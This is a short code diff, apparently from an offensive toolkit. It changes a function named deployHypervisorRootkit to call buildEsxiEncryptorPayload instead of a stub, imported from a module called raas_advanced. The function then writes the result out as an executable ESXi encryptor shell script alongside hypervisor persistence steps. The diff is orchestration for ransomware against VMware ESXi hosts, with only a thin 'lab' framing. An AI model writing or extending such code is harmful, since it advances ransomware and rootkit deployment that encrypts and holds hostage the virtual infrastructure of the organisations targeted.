@@ -3,7 +3,7 @@
  * Hypervisor persistence — ESXi audit, lab encrypt/recovery, chipsec VBS probes.
  */
 import { auditESXi } from "../esxi_audit.ts"
-import { runLabEsxiEncryptWithRecovery, buildEsxiEncryptorStub } from "../raas_advanced.ts"
+import { runLabEsxiEncryptWithRecovery, buildEsxiEncryptorPayload } from "../raas_advanced.ts"
 import * as path from "node:path"
 import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
 import { runCmd, step, type ExecStep } from "./_integrations.ts"
@@ -62,7 +62,7 @@ export async function deployHypervisorRootkit(opts: {
   writeArtifact("hypervisor", "lab_encrypt.json", JSON.stringify(lab, null, 2))
   steps.push(step("esxi_lab_encrypt", lab.recovered, lab.summary ?? String(lab.recovered)))
 
-  const stub = buildEsxiEncryptorStub(keyId)
+  const stub = buildEsxiEncryptorPayload(keyId)
   artifacts.push(writeArtifact("hypervisor", `esxi_encryptor_${keyId}.sh`, stub, 0o755))
 
   if (isToolAvailable("chipsec_main")) {
